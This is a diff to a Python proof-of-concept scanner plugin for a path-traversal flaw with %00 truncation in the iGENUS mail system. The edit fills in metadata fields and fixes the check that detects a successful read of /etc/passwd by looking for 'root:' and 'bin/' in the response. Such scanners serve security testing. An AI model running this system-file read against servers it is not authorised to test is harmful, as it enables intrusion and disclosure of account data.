@@ -12,11 +12,11 @@ class Vuln(ABVuln):
     desc = '''
         Lang存在遍历，%00截断。
     '''  # 漏洞描述
-    ref = ''  # 漏洞来源
-    cnvd_id = ''  # cnvd漏洞编号
-    cve_id = ''  # cve编号
+    ref = 'Unkonwn'  # 漏洞来源
+    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
+    cve_id = 'Unkonwn'  # cve编号
     product = 'iGENUS(爱琴思邮件系统)'  # 漏洞应用名称
-    product_version = ''  # 漏洞应用版本
+    product_version = 'Unkonwn'  # 漏洞应用版本
 
 class Poc(ABPoc):
     poc_id = '8ffdc1e7-d80f-4384-a1b5-d7ba22a9f97e'
@@ -35,7 +35,7 @@ class Poc(ABPoc):
             verify_url = self.target + payload
 
             req = requests.get(verify_url)
-            if req.status_code == 200 and 'root:' and 'bin/' in req.content:
+            if req.status_code == 200 and 'root:' in req.content and 'bin/' in req.content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -43,7 +43,7 @@ class Poc(ABPoc):
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        super(Poc, self).exploit()
+        self.verify()
 
 if __name__ == '__main__':
     Poc().run()
